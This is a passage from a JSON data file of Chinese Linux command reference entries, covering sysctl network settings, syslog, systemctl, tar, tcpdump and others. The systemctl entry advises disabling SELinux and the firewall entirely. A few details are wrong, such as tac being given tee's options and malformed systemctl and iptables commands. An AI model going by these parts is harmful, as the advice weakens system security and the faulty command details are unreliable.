net.ipv4.conf.default.rp_filter\u003d1\nsysctl -w net.ipv4.tcp_syncookies\u003d1\nsysctl -w net.ipv4.tcp_max_syn_backlog\u003d2048\nsysctl -w net.ipv4.tcp_fin_timeout\u003d30\nsysctl -w net.ipv4.tcp_synack_retries\u003d2\nsysctl -w net.ipv4.tcp_keepalive_time\u003d3600\nsysctl -w net.ipv4.tcp_window_scaling\u003d1\nsysctl -w net.ipv4.tcp_sack\u003d1\n```\n\n### 配置sysctl  \n\n编辑此文件：`/etc/sysctl.conf`\n\n如果该文件为空，则输入以下内容，否则请根据情况自己做调整：\n\n```\n# Controls source route verification\n# Default should work for all interfaces\nnet.ipv4.conf.default.rp_filter \u003d 1\n# net.ipv4.conf.all.rp_filter \u003d 1\n# net.ipv4.conf.lo.rp_filter \u003d 1\n# net.ipv4.conf.eth0.rp_filter \u003d 1\n\n# Disables IP source routing\n# Default should work for all interfaces\nnet.ipv4.conf.default.accept_source_route \u003d 0\n# net.ipv4.conf.all.accept_source_route \u003d 0\n# net.ipv4.conf.lo.accept_source_route \u003d 0\n# net.ipv4.conf.eth0.accept_source_route \u003d 0\n\n# Controls the System Request debugging functionality of the kernel\nkernel.sysrq \u003d 0\n\n# Controls whether core dumps will append the PID to the core filename.\n# Useful for debugging multi-threaded applications.\nkernel.core_uses_pid \u003d 1\n\n# Increase maximum amount of memory allocated to shm\n# Only uncomment if needed!\n# kernel.shmmax \u003d 67108864\n\n# Disable ICMP Redirect Acceptance\n# Default should work for all interfaces\nnet.ipv4.conf.default.accept_redirects \u003d 0\n# net.ipv4.conf.all.accept_redirects \u003d 0\n# net.ipv4.conf.lo.accept_redirects \u003d 0\n# net.ipv4.conf.eth0.accept_redirects \u003d 0\n\n# enable Log Spoofed Packets, Source Routed Packets, Redirect Packets\n# Default should work for all interfaces\nnet.ipv4.conf.default.log_martians \u003d 1\n# net.ipv4.conf.all.log_martians \u003d 1\n# net.ipv4.conf.lo.log_martians \u003d 1\n# net.ipv4.conf.eth0.log_martians \u003d 1\n\n# Decrease the time default value for tcp_fin_timeout connection\nnet.ipv4.tcp_fin_timeout \u003d 25\n\n# Decrease the time default value for tcp_keepalive_time connection\nnet.ipv4.tcp_keepalive_time \u003d 1200\n\n# Turn on the tcp_window_scaling\nnet.ipv4.tcp_window_scaling \u003d 1\n\n# Turn on the tcp_sack\nnet.ipv4.tcp_sack \u003d 1\n\n# tcp_fack should be on because of sack\nnet.ipv4.tcp_fack \u003d 1\n\n# Turn on the tcp_timestamps\nnet.ipv4.tcp_timestamps \u003d 1\n\n# Enable TCP SYN Cookie Protection\nnet.ipv4.tcp_syncookies \u003d 1\n\n# Enable ignoring broadcasts request\nnet.ipv4.icmp_echo_ignore_broadcasts \u003d 1\n\n# Enable bad error message Protection\nnet.ipv4.icmp_ignore_bogus_error_responses \u003d 1\n\n# make more local ports available\n# net.ipv4.ip_local_port_range \u003d 1024 65000\n\n# set TCP Re-Ordering value in kernel to ‘5′\nnet.ipv4.tcp_reordering \u003d 5\n\n# Lower syn retry rates\nnet.ipv4.tcp_synack_retries \u003d 2\nnet.ipv4.tcp_syn_retries \u003d 3\n\n# Set Max SYN Backlog to ‘2048′\nnet.ipv4.tcp_max_syn_backlog \u003d 2048\n\n# Various Settings\nnet.core.netdev_max_backlog \u003d 1024\n\n# Increase the maximum number of skb-heads to be cached\nnet.core.hot_list_length \u003d 256\n\n# Increase the tcp-time-wait buckets pool size\nnet.ipv4.tcp_max_tw_buckets \u003d 360000\n\n# This will increase the amount of memory available for socket input/output queues\nnet.core.rmem_default \u003d 65535\nnet.core.rmem_max \u003d 8388608\nnet.ipv4.tcp_rmem \u003d 4096 87380 8388608\nnet.core.wmem_default \u003d 65535\nnet.core.wmem_max \u003d 8388608\nnet.ipv4.tcp_wmem \u003d 4096 65535 8388608\nnet.ipv4.tcp_mem \u003d 8388608 8388608 8388608\nnet.core.optmem_max \u003d 40960\n```\n\n如果希望屏蔽别人 ping 你的主机，则加入以下代码：\n\n```\n# Disable ping requests\nnet.ipv4.icmp_echo_ignore_all \u003d 1\n```\n\n编辑完成后，请执行以下命令使变动立即生效：\n\n```\n/sbin/sysctl -p\n/sbin/sysctl -w net.ipv4.route.flush\u003d1\n```\n\n\n"},{"name":"syslog","categoryId":0,"data":"syslog\n\u003d\u003d\u003d\n\n系统默认的日志守护进程\n\n## 补充说明\n\n**syslog** 是Linux系统默认的日志守护进程。默认的syslog配置文件是/etc/syslog.conf文件。程序，守护进程和内核提供了访问系统的日志信息。因此，任何希望生成日志信息的程序都可以向 syslog 接口呼叫生成该信息。\n\n几乎所有的网络设备都可以通过syslog协议，将日志信息以用户数据报协议(UDP)方式传送到远端服务器，远端接收日志服务器必须通过syslogd监听UDP 端口514，并根据 syslog.conf配置文件中的配置处理本机，接收访问系统的日志信息，把指定的事件写入特定文件中，供后台数据库管理和响应之用。意味着可以让任何事件都登录到一台或多台服务器上，以备后台数据库用off-line(离线) 方法分析远端设备的事件。\n\n通常，syslog 接受来自系统的各种功能的信息，每个信息都包括重要级。/etc/syslog.conf 文件通知 syslogd 如何根据设备和信息重要级别来报告信息。\n\n### 使用方法  \n\n在/var/log中创建并写入日志信息是由syslog协议处理的，是由守护进程sylogd负责执行。每个标准的进程都可以用syslog记录日志。可以使用logger命令通过syslogd记录日志。\n\n要向syslog文件/var/log/messages中记录日志信息：\n\n```\nlogger this is a test log line\n\n输出：\ntail -n 1 messages\nJan  5 10:07:03 localhost root: this is a test log line\n\n```\n\n如果要记录特定的标记（tag）可以使用：\n\n```\nlogger -t TAG this is a test log line\n\n输出：\ntail -n 1 messages\nJan  5 10:37:14 localhost TAG: this is a test log line\n```\n\n\n"},{"name":"systemctl","categoryId":0,"data":"systemctl\n\u003d\u003d\u003d\n\n系统服务管理器指令\n\n## 补充说明\n\n**systemctl命令** 是系统服务管理器指令，它实际上将 service 和 chkconfig 这两个命令组合到一起。\n\n\u003ctable\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e任务\u003c/td\u003e\n\n\u003ctd\u003e旧指令\u003c/td\u003e\n\n\u003ctd\u003e新指令\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e使某服务自动启动\u003c/td\u003e\n\n\u003ctd\u003echkconfig --level 3 httpd on\u003c/td\u003e\n\n\u003ctd\u003esystemctl enable httpd.service\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e使某服务不自动启动\u003c/td\u003e\n\n\u003ctd\u003echkconfig --level 3 httpd off\u003c/td\u003e\n\n\u003ctd\u003esystemctl disable httpd.service\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e检查服务状态\u003c/td\u003e\n\n\u003ctd\u003eservice httpd status\u003c/td\u003e\n\n\u003ctd\u003esystemctl status httpd.service （服务详细信息） systemctl is-active httpd.service （仅显示是否 Active)\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e显示所有已启动的服务\u003c/td\u003e\n\n\u003ctd\u003echkconfig --list\u003c/td\u003e\n\n\u003ctd\u003esystemctl list-units --type\u003dservice\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e启动某服务\u003c/td\u003e\n\n\u003ctd\u003eservice httpd start\u003c/td\u003e\n\n\u003ctd\u003esystemctl start httpd.service\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e停止某服务\u003c/td\u003e\n\n\u003ctd\u003eservice httpd stop\u003c/td\u003e\n\n\u003ctd\u003esystemctl stop httpd.service\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e重启某服务\u003c/td\u003e\n\n\u003ctd\u003eservice httpd restart\u003c/td\u003e\n\n\u003ctd\u003esystemctl restart httpd.service\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n### 实例  \n\n1.启动nfs服务\n\n```\nsystemctl start nfs-server.service\n```\n\n2.设置开机自启动\n\n```\nsystemctl enable nfs-server.service\n```\n\n3.停止开机自启动\n\n```\nsystemctl disable nfs-server.service\n```\n\n4.查看服务当前状态\n\n```\nsystemctl status nfs-server.service\n```\n\n5.重新启动某服务\n\n```\nsystemctl restart nfs-server.service\n```\n\n6.查看所有已启动的服务\n\n```\nsystemctl list -units --type\u003dservice\n```\n\n开启防火墙22端口\n\n```\niptables -I INPUT -p tcp --dport 22 -j accept\n```\n\n如果仍然有问题，就可能是SELinux导致的\n\n关闭SElinux：\n\n修改`/etc/selinux/config`文件中的`SELINUX\u003d””`为disabled，然后重启。\n\n彻底关闭防火墙：\n\n```\nsudo systemctl status firewalld.service\nsudo systemctl stop firewalld.service          \nsudo systemctl disable firewalld.service\n```\n\n\n"},{"name":"systool","categoryId":0,"data":"systool\n\u003d\u003d\u003d\n\n显示基于总线、类和拓扑显示系统中设备的信息\n\n## 补充说明\n\n**systool命令** 指令显示基于总线、类和拓扑显示系统中设备的信息。\n\n### 语法  \n\n```\nsystool(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：显示被请求资源的属性；\n-b\u003c总线\u003e：显示指定总线的信息；\n-c\u003cclass\u003e：显示指定类的信息；\n-d：仅显示设备；\n-h：显示指令的用法；\n-m\u003c模块名称\u003e：显示指定模块的信息；\n-p：显示资源的“sysfs”绝对路径；\n-v：显示所有属性；\n-A\u003c属性\u003e：显示请求资源的属性值；\n-D：仅显示驱动程序信息；\n-P：显示设备的父类。\n```\n\n### 参数  \n\n设备：指定要查看信息的设备名称。\n\n### 实例  \n\n```\n[root@localhost ~]# systool\nSupported sysfs buses:\n        acpi\n        i2c\n        ide\n        pci_express\n        pci\n        pcmcia\n        platform\n        pnp\n        scsi\n        serio\n        usb\nSupported sysfs classes:\n        backlight\n        cpuid\n        dma_v3\n        firmware\n        graphics\n        hidraw\n        hwmon\n        i2c-adapter\n        input\n        leds\n        mem\n        misc\n        msr\n        net\n        pci_bus\n        pcmcia_socket\n        printer\n        raw\n        sas_device\n        sas_end_device\n        sas_expander\n        sas_host\n        sas_phy\n        sas_port\n        scsi_device\n        scsi_disk\n        scsi_generic\n        scsi_host\n        sound\n        tty\n        usb_device\n        usb_endpoint\n        usb_host\n        vc\n        vtconsole\nSupported sysfs devices:\n        acpi\n        pci0000:00\n        platform\n        pnp0\n        sequencer2\n        sequencer\n        seq\n        system\n        timer\nSupported sysfs modules:\n        8250\n        acpi_memhotplug\n        ac\n        asus_acpi\n        ata_piix\n        auth_rpcgss\n        backlight\n        battery\n        button\n        cifs\n        cpufreq\n        crypto_api\n        dell_wmi\n        dm_log\n        dm_mem_cache\n        dm_message\n        dm_mirror\n        dm_mod\n        dm_multipath\n        dm_raid45\n        dm_region_hash\n        dock\n        e1000e\n        edac_mc\n        ehci_hcd\n        exportfs\n        ext3\n        hwmon\n        i2c_core\n        i2c_ec\n        i2c_i801\n        i7core_edac\n        i8042\n        ip_conntrack_netbios_ns\n        ip_conntrack\n        ip_tables\n        iptable_filter\n        ipv6\n        it821x\n        jbd\n        joydev\n        keyboard\n        libata\n        lockd\n        lp\n        md_mod\n        mousedev\n        mpt2sas\n        nfnetlink\n        nfs_acl\n        nfsd\n        nls_utf8\n        ohci_hcd\n        parport_pc\n        parport\n        pci_hotplug\n        pcmcia\n        pcmcia_core\n        pcspkr\n        piix\n        power_meter\n        printk\n        processor\n        psmouse\n        rsrc_nonstatic\n        sbs\n        scsi_dh\n        scsi_mod\n        scsi_transport_sas\n        sd_mod\n        serio_raw\n        sg\n        shpchp\n        snd_hda_intel\n        snd_hwdep\n        snd_mixer_oss\n        snd_page_alloc\n        snd_pcm_oss\n        snd_pcm\n        snd_seq_device\n        snd_seq_dummy\n        snd_seq_midi_event\n        snd_seq_oss\n        snd_seq\n        snd_timer\n        snd\n        soundcore\n        sunrpc\n        tcp_bic\n        tpm_bios\n        tpm_tis\n        tpm\n        uhci_hcd\n        usbcore\n        usbhid\n        video\n        wmi\n        x_tables\n        xfrm_nalgo\n        xt_limit\n        xt_state\n        xt_tcpudp\n        yenta_socket\n```\n\n\n"},{"name":"tac","categoryId":0,"data":"tac\n\u003d\u003d\u003d\n\n将文件已行为单位的反序输出\n\n## 补充说明\n\n**tac命令** 用于将文件已行为单位的反序输出，即第一行最后显示，最后一行先显示。\n\n### 语法  \n\n```\ntac(选项)(参数)\n```\n\n### 选项  \n\n```\n-a或——append：将内容追加到文件的末尾；\n-i或——ignore-interrupts：忽略中断信号。\n```\n\n### 参数  \n\n文件列表：指定要保存内容的文件列表。\n\n\n"},{"name":"tail","categoryId":0,"data":"tail\n\u003d\u003d\u003d\n\n在屏幕上显示指定文件的末尾若干行\n\n## 补充说明\n\n**tail命令** 用于输入文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。\n\n注意：如果表示字节或行数的N值之前有一个”+”号，则从文件开头的第N项开始显示，而不是显示文件的最后N项。N值后面可以有后缀：b表示512，k表示1024，m表示1 048576(1M)。\n\n### 语法  \n\n```\ntail(选项)(参数)\n```\n\n### 选项  \n\n```\n--retry：即是在tail命令启动时，文件不可访问或者文件稍后变得不可访问，都始终尝试打开文件。使用此选项时需要与选项“——follow\u003dname”连用；\n-c\u003cN\u003e或——bytes\u003d\u003cN\u003e：输出文件尾部的N（N为整数）个字节内容；\n-f\u003cname/descriptor\u003e或；--follow\u003cnameldescript\u003e：显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。“-f”与“-fdescriptor”等效；\n-F：与选项“-follow\u003dname”和“--retry\"连用时功能相同；\n-n\u003cN\u003e或——line\u003d\u003cN\u003e：输出文件的尾部N（N位数字）行内容。\n--pid\u003d\u003c进程号\u003e：与“-f”选项连用，当指定的进程号的进程终止后，自动退出tail命令；\n-q或——quiet或——silent：当有多个文件参数时，不输出各个文件名；\n-s\u003c秒数\u003e或——sleep-interal\u003d\u003c秒数\u003e：与“-f”选项连用，指定监视文件变化时间隔的秒数；\n-v或——verbose：当有多个文件参数时，总是输出各个文件名；\n--help：显示指令的帮助信息；\n--version：显示指令的版本信息。\n```\n\n### 参数  \n\n文件列表：指定要显示尾部内容的文件列表。\n\n### 实例  \n\n```\ntail file （显示文件file的最后10行）\ntail +20 file （显示文件file的内容，从第20行至文件末尾）\ntail -c 10 file （显示文件file的最后10个字符）\n```\n\n\n"},{"name":"tailf","categoryId":0,"data":"tailf\n\u003d\u003d\u003d\n\n在屏幕上显示指定文件的末尾若干行内容，通常用于日志文件的跟踪输出。\n\n## 补充说明\n\ntailf命令几乎等同于`tail -f`，严格说来应该与`tail --follow\u003dname`更相似些。当文件改名之后它也能继续跟踪，特别适合于日志文件的跟踪（follow the growth of a log file）。与`tail -f`不同的是，如果文件不增长，它不会去访问磁盘文件。tailf特别适合那些便携机上跟踪日志文件，因为它能省电，因为减少了磁盘访问。tailf命令不是个脚本，而是一个用C代码编译后的二进制执行文件，某些Linux安装之后没有这个命令。\n\ntailf和tail -f的区别\n\n1. tailf 总是从文件开头一点一点的读， 而tail -f 则是从文件尾部开始读\n2. tailf check文件增长时，使用的是文件名， 用stat系统调用；而tail -f 则使用的是已打开的文件描述符； 注：tail 也可以做到类似跟踪文件名的效果； 但是tail总是使用fstat系统调用，而不是stat系统调用；结果就是：默认情况下，当tail的文件被偷偷删除时，tail是不知道的，而tailf是知道的。\n\n### 语法  \n\n```bash\ntailf logfile # 动态跟踪日志文件logfile，最初的时候打印文件的最后10行内容。\n```\n\n### 选项  \n\n```bash\n-n, --lines NUMBER  # 输出最后数行\n-NUMBER             # 与NUMBER相同 `-n NUMBER\u0027\n-V, --version       # 输出版本信息并退出\n-h, --help          # 显示帮助并退出\n```\n\n### 参数  \n\n目标：指定目标日志。\n\n### 实例\n```\ntailf log/WEB.LOG \ntailf -n 5 log2014.log   # 显示文件最后5行内容\n```\n\n\n\n"},{"name":"talk","categoryId":9,"data":"talk\n\u003d\u003d\u003d\n\n让用户和其他用户聊天\n\n## 补充说明\n\n**talk命令** 是talk服务器的客户端工具，通过talk命令可以让用户和其他用户聊天。linux中talk命令参数程序的使用很简单，只要知道交谈对象的地址，就可以邀请对方交谈。\n\n### 语法  \n\n```\ntalk(参数)\n```\n\n### 参数  \n\n*   用户：指定聊天的用户；\n*   终端：指定用户的终端。\n\n### 实例  \n\n例如登录在主机rs6000.cic.test.com上的用户jdx希望和登录在主机tirc.cs.test.com上的用户wangxz进行交谈，则可以输入下面的命令：\n\n```\ntalk wangxz@tirc.cs.test.com\n```\n\nInternet上的相关程序（Talk Daemon）就会传送一条信息邀请wangxz来交谈，这时用户wangxz的屏幕上就会出现如下信息，并响铃提示：\n\n```\nMessage from Talk_Daemon@tirc.cs.test.com at 21:44 …\ntalk: connection requested by jdx@rs6000.cic.test.com\ntalk: respond with:  talk jdx@rs6000.cic.test.com\n```\n\n这时，用户wangxz应该做的工作就是按照上面的信息提示，即输入linux中talk命令：\n\n```\ntalk jdx@rs6000.cic.test.com\n```\n\n之后，连接建立成功，两个用户就可以进行交谈了。这时，双方的终端屏幕上都将显示信息 **[Connection established]** 并响铃，同时屏幕被linux中talk命令程序以一条水平线分割为上下两部分，上半部分用来显示用户自己输入的内容，下半部分用来显示对方输入的内容。两个用户可以同时输入，他们输入的内容将会立即显示在双方的屏幕上。\n\n在用户进行输入时，可按 **BACKSPACE** 见来更正前一个字符，也可按 **CTRL+w** 来删除一个完整的单词，或者用 **CTRL+U** 来删除一整行，另外，用户还可以通过按 **CTRL+L** 来刷新屏幕。如果要结束交谈，可由任何一方按下 **CTRL+C** 来中断连接，但在结束对话前最好道声“再见”，并等待对方回应。linux中talk命令程序结束时，在屏幕上将回显示一条信息：\n\n```\n[Connection closing. Exiting]\n```\n\n并非每次要求对方交谈都能成功，有时对方没有登录，则linux中talk命令程序提示信息：\n\n```\n[Your party is not logged on]\n```\n\n并退出；如果对方已登录，但因某种原因（如不是正在使用机器）没有响应，那么linux中talk命令程序将会每隔10秒钟给他发一条邀请信息，同时在自己的屏幕上显示：\n\n```\n[Ringing your party again]\n```\n\n如果用户不愿等待，则可以按 **CTRL+C** 终止linux中talk命令程序。还有的时候系统可能出现下面的信息：\n\n```\n[Checking for invitation on caller’s machine]\n```\n\n这说明双方的linux中talk命令程序不兼容，这时可以试试ntalk和ytalk命令，如果没有，就只好找系统管理员了。\n\n如果用户在做某些紧急工作（如编辑邮件）时不希望被linux中talk命令的邀请打搅，他可以使用命令：\n\n```\nmesg n\n```\n\n来暂时拒绝交谈，这时如果有用户邀请他交谈，只能得到提示信息：\n\n```\n[Your party is refusing messages]\n```\n\n不过要注意的是，一旦完成紧急工作。最好立即打开信息接收开关（用命令`mesg y`），否则将会失去很多信息交流的机会。\n\n以上是linux中talk命令参数的是使用方法。\n\n\n"},{"name":"tar","categoryId":10,"data":"tar\n\u003d\u003d\u003d\n\nLinux下的归档使用工具，用来打包和备份。\n\n## 补充说明\n\n**tar命令** 可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。\n\n首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。\n\n为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。\n\n### 语法  \n\n```\ntar(选项)(参数)\n```\n\n### 选项  \n\n```\n-A或--catenate：新增文件到以存在的备份文件；\n-B：设置区块大小；\n-c或--create：建立新的备份文件；\n-C \u003c目录\u003e：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。\n-d：记录文件的差别；\n-x或--extract或--get：从备份文件中还原文件；\n-t或--list：列出备份文件的内容；\n-z或--gzip或--ungzip：通过gzip指令处理备份文件；\n-Z或--compress或--uncompress：通过compress指令处理备份文件；\n-f\u003c备份文件\u003e或--file\u003d\u003c备份文件\u003e：指定备份文件；\n-v或--verbose：显示指令执行过程；\n-r：添加文件到已经压缩的文件；\n-u：添加改变了和现有的文件到已经存在的压缩文件；\n-j：支持bzip2解压文件；\n-v：显示操作过程；\n-l：文件系统边界设置；\n-k：保留原有文件不覆盖；\n-m：保留文件不被覆盖；\n-w：确认压缩文件的正确性；\n-p或--same-permissions：用原来的文件权限还原文件；\n-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；\n-N \u003c日期格式\u003e 或 --newer\u003d\u003c日期时间\u003e：只将较指定日期更新的文件保存到备份文件里；\n--exclude\u003d\u003c范本样式\u003e：排除符合范本样式的文件。\n```\n\n### 参数  \n\n文件或目录：指定要打包的文件或目录列表。\n\n### 实例  \n\n```bash\n- z：有gzip属性的\n- j：有bz2属性的\n- Z：有compress属性的\n- v：显示所有过程\n- O：将文件解开到标准输出\n```\n\n下面的参数-f是必须的\n\n-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。\n\n```bash\ntar -cf all.tar *.jpg\n# 这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。\n\ntar -rf all.tar *.gif\n# 这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。\n\ntar -uf all.tar logo.gif\n# 这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。\n\ntar -tf all.tar\n# 这条命令是列出all.tar包中所有文件，-t是列出文件的意思\n```\n\n\n#### zip格式\n\n压缩： zip -r [目标文件名].zip [原文件/目录名]  \n解压： unzip [原文件名].zip  \n注：-r参数代表递归  \n\n#### tar格式（该格式仅仅打包，不压缩）\n\n打包：tar -cvf [目标文件名].tar [原文件名/目录名]  \n解包：tar -xvf [原文件名].tar  \n注：c参数代表create（创建），x参数代表extract（解包），v参数代表verbose（详细信息），f参数代表filename（文件名），所以f后必须接文件名。  \n\n#### tar.gz格式\n\n方式一：利用前面已经打包好的tar文件，直接用压缩命令。\n\n压缩：gzip [原文件名].tar  \n解压：gunzip [原文件名].tar.gz  \n\n方式二：一次性打包并压缩、解压并解包\n\n打包并压缩： tar -zcvf [目标文件名].tar.gz [原文件名/目录名]  \n解压并解包： tar -zxvf [原文件名].tar.gz  \n注：z代表用gzip算法来压缩/解压。  \n\n#### tar.bz2格式\n\n方式一：利用已经打包好的tar文件，直接执行压缩命令：\n\n压缩：bzip2 [原文件名].tar  \n解压：bunzip2 [原文件名].tar.bz2  \n方式二：一次性打包并压缩、解压并解包  \n\n打包并压缩： tar -jcvf [目标文件名].tar.bz2 [原文件名/目录名]  \n解压并解包： tar -jxvf [原文件名].tar.bz2  \n注：小写j代表用bzip2算法来压缩/解压。  \n\n#### tar.xz格式\n\n方式一：利用已经打包好的tar文件，直接用压缩命令：\n\n压缩：xz [原文件名].tar  \n解压：unxz [原文件名].tar.xz  \n方式二：一次性打包并压缩、解压并解包  \n\n打包并压缩： tar -Jcvf [目标文件名].tar.xz [原文件名/目录名]  \n解压并解包： tar -Jxvf [原文件名].tar.xz  \n注：大写J代表用xz算法来压缩/解压。  \n\n#### tar.Z格式（已过时）\n\n方式一：利用已经打包好的tar文件，直接用压缩命令：\n\n压缩：compress [原文件名].tar  \n解压：uncompress [原文件名].tar.Z  \n方式二：一次性打包并压缩、解压并解包  \n\n打包并压缩： tar -Zcvf [目标文件名].tar.Z [原文件名/目录名]  \n解压并解包： tar -Zxvf [原文件名].tar.Z  \n注：大写Z代表用ncompress算法来压缩/解压。另，ncompress是早期Unix系统的压缩格式，但由于ncompress的压缩率太低，现已过时。  \n\n#### jar格式\n\n压缩：jar -cvf [目标文件名].jar [原文件名/目录名]  \n解压：jar -xvf [原文件名].jar  \n注：如果是打包的是Java类库，并且该类库中存在主类，那么需要写一个META-INF/MANIFEST.MF配置文件，内容如下：  \n\nManifest-Version: 1.0  \nCreated-By: 1.6.0_27 (Sun Microsystems Inc.)  \nMain-class: the_name_of_the_main_class_should_be_put_here  \n然后用如下命令打包：  \n\njar -cvfm [目标文件名].jar META-INF/MANIFEST.MF [原文件名/目录名]\n这样以后就能用“java -jar [文件名].jar”命令直接运行主类中的public static void main方法了。\n\n#### 7z格式\n\n压缩：7z a [目标文件名].7z [原文件名/目录名]  \n解压：7z x [原文件名].7z  \n注：这个7z解压命令支持rar格式，即：  \n\n7z x [原文件名].rar\n\n#### 其它例子\n\n **将文件全部打包成tar包** ：\n\n```\ntar -cvf log.tar log2012.log    仅打包，不压缩！ \ntar -zcvf log.tar.gz log2012.log   打包后，以 gzip 压缩 \ntar -jcvf log.tar.bz2 log2012.log  打包后，以 bzip2 压缩 \n```\n\n在选项`f`之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。 如果加`z`选项，则以.tar.gz或.tgz来代表gzip压缩过的tar包；如果加`j`选项，则以.tar.bz2来作为tar包名。\n\n **查阅上述tar包内有哪些文件** ：\n\n```\ntar -ztvf log.tar.gz\n```\n\n由于我们使用 gzip 压缩的log.tar.gz，所以要查阅log.tar.gz包内的文件时，就得要加上`z`这个选项了。\n\n **将tar包解压缩** ：\n\n```\ntar -zxvf /opt/soft/test/log.tar.gz\n```\n\n在预设的情况下，我们可以将压缩档在任何地方解开的\n\n **只将tar内的部分文件解压出来** ：\n\n```\ntar -zxvf /opt/soft/test/log30.tar.gz log2013.log\n```\n\n我可以透过`tar -ztvf`来查阅 tar 包内的文件名称，如果单只要一个文件，就可以透过这个方式来解压部分文件！\n\n **文件备份下来，并且保存其权限** ：\n\n```\ntar -zcvpf log31.tar.gz log2014.log log2015.log log2016.log\n```\n\n这个`-p`的属性是很重要的，尤其是当您要保留原本文件的属性时。\n\n **在文件夹当中，比某个日期新的文件才备份** ：\n\n```\ntar -N \"2012/11/13\" -zcvf log17.tar.gz test\n```\n\n **备份文件夹内容是排除部分文件：** \n\n```\ntar --exclude scf/service -zcvf scf.tar.gz scf/*\n```\n\n **其实最简单的使用 tar 就只要记忆底下的方式即可：** \n\n```\n压　缩：tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称\n查　询：tar -jtv -f filename.tar.bz2\n解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录\n```\n\n\n\n"},{"name":"tcpdump","categoryId":9,"data":"tcpdump\n\u003d\u003d\u003d\n\n一款sniffer工具\n\n## 补充说明\n\n**tcpdump命令** 是一款sniffer工具，它可以打印所有经过网络接口的数据包的头信息，也可以使用`-w`选项将数据包保存到文件中，方便以后分析。\n\n### 语法  \n\n```\ntcpdump(选项)\n```\n\n### 选项  \n\n```\n-a：尝试将网络和广播地址转换成名称；\n-c\u003c数据包数目\u003e：收到指定的数据包数目后，就停止进行倾倒操作；\n-d：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；\n-dd：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；\n-ddd：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；\n-e：在每列倾倒资料上显示连接层级的文件头；\n-f：用数字显示网际网络地址；\n-F\u003c表达文件\u003e：指定内含表达方式的文件；\n-i\u003c网络界面\u003e：使用指定的网络截面送出数据包；\n-l：使用标准输出列的缓冲区；\n-n：不把主机的网络地址转换成名字；\n-N：不列出域名；\n-O：不将数据包编码最佳化；\n-p：不让网络界面进入混杂模式；\n-q ：快速输出，仅列出少数的传输协议信息；\n-r\u003c数据包文件\u003e：从指定的文件读取数据包数据；\n-s\u003c数据包大小\u003e：设置每个数据包的大小；\n-S：用绝对而非相对数值列出TCP关联数；\n-t：在每列倾倒资料上不显示时间戳记；\n-tt： 在每列倾倒资料上显示未经格式化的时间戳记；\n-T\u003c数据包类型\u003e：强制将表达方式所指定的数据包转译成设置的数据包类型；\n-v：详细显示指令执行过程；\n-vv：更详细显示指令执行过程；\n-x：用十六进制字码列出数据包资料；\n-w\u003c数据包文件\u003e：把数据包数据写入指定的文件。\n```\n\n### 实例  \n\n **直接启动tcpdump将监视第一个网络接口上所有流过的数据包** \n\n```\ntcpdump\n```\n\n **监视指定网络接口的数据包** \n\n```\ntcpdump -i eth1\n```\n\n如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0，下面的例子都没有指定网络接口。\n\n **监视指定主机的数据包** \n\n打印所有进入或离开sundown的数据包。\n\n```\ntcpdump host sundown\n```\n\n也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包\n\n```\ntcpdump host 210.27.48.1\n```\n\n打印helios 与 hot 或者与 ace 之间通信的数据包\n\n```\ntcpdump host helios and \\( hot or ace \\)\n```\n\n截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信\n\n```\ntcpdump host 210.27.48.1 and \\ (210.27.48.2 or 210.27.48.3 \\)\n```\n\n打印ace与任何其他主机之间通信的IP 数据包, 但不包括与helios之间的数据包.\n\n```\ntcpdump ip host ace and not helios\n```\n\n如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：\n\n```\ntcpdump ip host 210.27.48.1 and ! 210.27.48.2\n```\n\n截获主机hostname发送的所有数据\n\n```\ntcpdump -i eth0 src host hostname\n```\n\n监视所有送到主机hostname的数据包\n\n```\ntcpdump -i eth0 dst host hostname\n```\n\n **监视指定主机和端口的数据包** 